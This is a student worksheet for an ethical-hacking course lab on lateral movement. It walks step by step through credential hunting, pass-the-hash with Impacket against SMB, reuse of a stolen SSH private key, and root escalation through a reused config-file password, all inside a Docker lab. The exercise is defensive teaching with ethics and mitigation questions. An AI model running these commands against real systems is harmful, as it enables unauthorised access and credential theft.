# Week 9: Lateral Movement Between Systems and Services

## CYB204 Ethical Hacking — Student Worksheet

---

## Before We Start (5 minutes)

### Important Rules
✅ **DO:** Only attack hosts inside this lab environment
✅ **DO:** Read each step before running it — several steps depend on the one before it
✅ **DO:** Keep a note of every credential, hash, and key you find — you'll need to reuse each one
❌ **DON'T:** Attempt any of these techniques (hash reuse, SSH key reuse, password reuse) on any real network without written authorisation

### Scenario
You've already got a foothold on `week9-workstation` — credentials for a
low-privilege account were obtained during an earlier phase of this
engagement (how doesn't matter this week; **Week 8** covered earning a
foothold from nothing). Your job now is to use that single foothold to move
laterally: find what it leads to, and keep reusing what you find until you
reach `root` somewhere else on the network.

### Network Map

```
                    ┌──────────────────────────┐
                    │  week9-attacker (Kali)    │
                    │       10.10.9.2           │
                    └─────────────┬─────────────┘
                                  │
                                  │ ssh netadmin@10.10.9.10
                                  │ (foothold creds — given)
                                  ▼
                    ┌──────────────────────────┐
                    │  week9-workstation         │   STEP 1: FOOTHOLD
                    │  10.10.9.10                │
                    │  user: netadmin            │
                    └─────────────┬──────────────┘
                                  │
                   found here, reused on two different hosts:
                                  │
              ┌───────────────────┴───────────────────┐
              │ weak-perm file                         │ world-readable file
              │ → svcacct NTLM hash                    │ → deskuser SSH private key
              ▼                                        ▼
  ┌──────────────────────────┐            ┌──────────────────────────┐
  │  week9-fileserver (SMB)   │            │  week9-ubuntu-desktop    │  STEP 3:
  │  10.10.9.12               │            │  10.10.9.11              │  FINAL TARGET
  │                           │            │                          │
  │  STEP 2: PASS-THE-HASH    │            │  password login: BLOCKED│
  │  impacket-smbclient       │            │  ssh -i <stolen key> →  │
  │  -hashes :<NT hash>  ───► │            │  deskuser          ───► │
  │  reaches "secure" share   │            │  config file leaks      │
  │  (never touches the real  │            │  root's reused password │
  │  plaintext password)      │            │  su root ───► root.txt  │
  └──────────────────────────┘            └──────────────────────────┘
```

**On terminology:** this isn't *network pivoting* in the routing sense —
there's no segmented subnet to tunnel through, and every host above is
directly reachable from the attacker the whole time (verify this yourself:
`nmap -sn 10.10.9.0/24` sees all three targets immediately, no SSH tunnel
required). What's "moving" here is **credentials and trust**, not network
access: a hash found on one host unlocks a service on a second host, and a
private key found on that same first host unlocks a login on a third.
That's lateral movement — the attacker's reachable network never changes,
only what they're able to authenticate to within it.

---

## Setup (5 minutes)

```bash
# Linux / macOS / Git Bash
make run-week9

# Windows PowerShell / Command Prompt
cd labs\week9 && docker compose up -d
```

Provisioning takes about 30–45 seconds (installing SSH/Samba, creating
users, generating the SSH keypair used in Part 3). Then enter the attacker:

```bash
docker exec -it week9-attacker bash
```

---

## Part 1: Enumerate the Network (10 minutes)

### Task 1: Identify Active Systems

```bash
# -sn : ping scan only (host discovery, no port scan)
nmap -sn 10.10.9.0/24
```

**Question:** Which IP addresses are active?

_________________________________

```bash
# -sV : probe open ports to determine the service/version running
nmap -sV -p 22 10.10.9.10
```

**Question:** What service and version is running on `week9-workstation`?

_________________________________

---

## Part 2: Credential Dumping on the Foothold (20 minutes)

### Task 2: Log In and Try to Dump Credentials

You've been given a foothold account: `netadmin` / `Sp1ngR3set!` (consider
this "obtained in a prior phase" — password spraying, a phishing result, a
leaked ticket, whatever the scenario needs it to be).

```bash
ssh netadmin@10.10.9.10
```

Try the classic first move — read `/etc/shadow` directly:

```bash
cat /etc/shadow
```

**Question:** Were you able to view it? Why or why not?

_________________________________

### Task 3: Find Files With Weak Permissions

Since `/etc/shadow` is locked down, hunt for sloppier mistakes instead:

```bash
# -type f        : regular files only
# -perm -o+w     : the "others" permission bits include write — i.e.
#                  world-writable, which a low-priv account should never need
find / -type f -perm -o+w 2>/dev/null
```

**Question:** What file did you find, and what's in it?

```bash
cat <the file you found>
```

_________________________________

Look closely at the format of what's inside — it's laid out like the output
of a credential-dumping tool (e.g. Impacket's `secretsdump.py`):
`username:uid:LM-hash:NT-hash:::`. **Write down the NT hash** — you'll need
it in Part 3. Note that you never saw a plaintext password anywhere; only a
hash. That distinction matters for what comes next.

### Task 4: Search for SSH Keys

```bash
# A classic lateral-movement find: a private key left lying around
find / -name id_rsa 2>/dev/null
```

**Question:** Where did you find a private key, and whose key does it look
like it's for (check any comments or hints near it)?

_________________________________

```bash
cat /opt/maintenance/.ssh_backup/id_rsa
# Save it locally so you can use it as a login key later:
cat /opt/maintenance/.ssh_backup/id_rsa > ~/stolen_id_rsa
chmod 600 ~/stolen_id_rsa
exit
```

---

## Part 3: Pass-the-Hash Against the File Server (20 minutes)

### Task 5: Enumerate SMB Anonymously

Back on the attacker:

```bash
# -L : list shares   -N : no password (anonymous/null session)
smbclient -L //10.10.9.12/ -N
```

**Question:** What shares are available?

_________________________________

```bash
smbclient //10.10.9.12/public -N -c 'ls; get notice.txt -'
```

**Question:** What does the public notice say?

_________________________________

### Task 6: Try (and Fail) to Reach the Secure Share Anonymously

```bash
smbclient //10.10.9.12/secure -N -c 'ls'
```

**Question:** What happened? Why doesn't the anonymous session work here?

_________________________________

### Task 7: Pass-the-Hash with Impacket

You never cracked a password — but you don't need the plaintext when you
have the NT hash. This is the actual Pass-the-Hash technique from the
slides: **"use a stolen hash to authenticate without plaintext
credentials."**

```bash
# -hashes LM:NT  : an empty LM hash before the colon is fine — only the
#                  NT hash matters for this kind of auth
impacket-smbclient -hashes :<the NT hash you found> svcacct@10.10.9.12
```

Inside the Impacket shell:
```
shares
use secure
ls
cat handover-notes.txt
exit
```

**Question:** What do the handover notes say about reaching the next
target?

_________________________________

**Reflection:** You authenticated as `svcacct` without ever knowing its
real password. Why does this matter for how organisations should rotate
credentials after a breach — is "change the password" always enough?

_________________________________

---

## Part 4: Exploiting a Trust Relationship (SSH Key Reuse) (15 minutes)

### Task 8: Confirm Password Login Is a Dead End

```bash
ssh deskuser@10.10.9.11
```

**Question:** What happens? (Try any password you like — it won't matter.)

_________________________________

### Task 9: Use the Stolen Key Instead

```bash
ssh -i ~/stolen_id_rsa deskuser@10.10.9.11
whoami
```

**Question:** Did it work? What does this tell you about why backing up an
SSH private key insecurely (world-readable, sitting in a random directory)
is just as dangerous as a leaked password?

_________________________________

---

## Part 5: Credential Hunting and Privilege Escalation (15 minutes)

### Task 10: Search Config Files for Passwords

The slides frame this as a "Windows-like credential extraction" step (the
original material even names `mimikatz.exe`). There's no Windows kernel
under this container for a Windows-only tool to run against, so the real
Linux equivalent is the same idea with different commands — hunting for
credentials accidentally left in plaintext configuration:

```bash
find / -name "*.conf" -path "*/app/*" 2>/dev/null
cat /etc/app/backup.conf
```

**Question:** What credential did you find, and for which account?

_________________________________

### Task 11: Escalate Using the Reused Password

```bash
su root
# enter the password from the config file
cat /root/root.txt
```

**Question:** What flag did you retrieve? Why is password reuse across
services (a backup account's password matching `root`'s) such a common and
dangerous real-world finding?

_________________________________

---

## Part 6: Ethics, Detection, and Reflection (10 minutes)

### Discussion Questions

1. **Scope creep:** Pass-the-Hash and SSH key reuse let you reach systems
   you were never explicitly told about. Before touching
   `week9-ubuntu-desktop`, what should you confirm is in scope?

   _________________________________

2. **Detection:** WannaCry spread largely through SMB. What's one thing a
   defender could monitor for that would have caught the Pass-the-Hash
   authentication you just performed?

   _________________________________

3. **Mitigation:** Name two concrete changes to this environment (not "use
   better passwords" — be specific) that would have broken this attack
   chain at a single point.

   _________________________________

---

## Quick Knowledge Check

1. What makes Pass-the-Hash possible?
   - A) Weak passwords  B) Reusing a hash instead of needing the plaintext password  C) SQL injection  D) DNS spoofing

2. Why did `cat /etc/shadow` fail as `netadmin`?
   - A) The file doesn't exist  B) `netadmin` isn't root and isn't in the `shadow` group  C) SELinux blocked it  D) It's an SMB-only file

3. Why did password login to `week9-ubuntu-desktop` fail even with a
   correct-looking attempt?
   - A) The account is locked  B) `PasswordAuthentication` is disabled — only key-based (trust) login works  C) The network blocked port 22  D) It never fails

4. What real-world lesson does the reused `root_password` in
   `backup.conf` teach?
   - A) Config files should never exist  B) Credentials reused across services turn one leak into many compromises  C) Backups are unnecessary  D) `su` is inherently insecure

5. True/False: Impacket's `psexec.py` / `wmiexec.py` will work the same way
   against a Linux Samba server as they do against a real Windows host.
   (Hint: think about what RPC service they depend on.)

---

## A Note on Windows-Only Tooling

The original material this worksheet is based on names `mimikatz.exe`,
`net user`, and `impacket-psexec`/`wmiexec` against a generic "Windows
target." Every host in this lab is Linux, for the same reason Week 8's
worksheet explains: there's no Windows kernel underneath for
Windows-specific tools to talk to.

- `mimikatz` → the Linux equivalent is exactly what Part 5 did: hunting
  the filesystem for exposed credentials, rather than dumping them from
  LSASS memory.
- `impacket-psexec` / `wmiexec` → these rely on Windows-only RPC services
  (`SVCCTL` for service creation, DCOM for WMI) that Samba does not
  implement, so they do not work against this lab's file server even
  though the SMB protocol itself is shared. The genuinely cross-platform
  Impacket technique — Pass-the-Hash SMB authentication — is exactly what
  Part 3 had you do.
- If you want to see `impacket-psexec` actually pop a shell, you need a
  real (or virtualised) Windows target. A Windows Server VM with SMB
  signing disabled and a known local admin hash is the standard way to
  practice this outside class.

---

## Cleanup

```bash
cd labs/week9 && docker compose down
```

---

## Summary

Today you learned to:
✓ Enumerate a network and the services running on each host
✓ Recognise and exploit weak file permissions to dump credentials
✓ Perform a genuine Pass-the-Hash attack with Impacket against SMB
✓ Exploit a trust relationship by reusing a leaked SSH private key
✓ Hunt for credentials in configuration files and escalate via password reuse
✓ Explain why Windows-only tools (`mimikatz`, `psexec`'s service-creation
  RPC) don't translate directly to a Linux target, and what does

**Instructor Contact:** _________________________________

---

## Optional: CTF Challenge

Once you have completed all exercises above, test your skills with an
optional Capture The Flag challenge.

See **[ctf-challenge.md](./ctf-challenge.md)** for objectives.

Two flags to capture: `user.txt` and `root.txt`
Flag format: `flag{...}`
No hints — instructor walkthrough released at end of session.
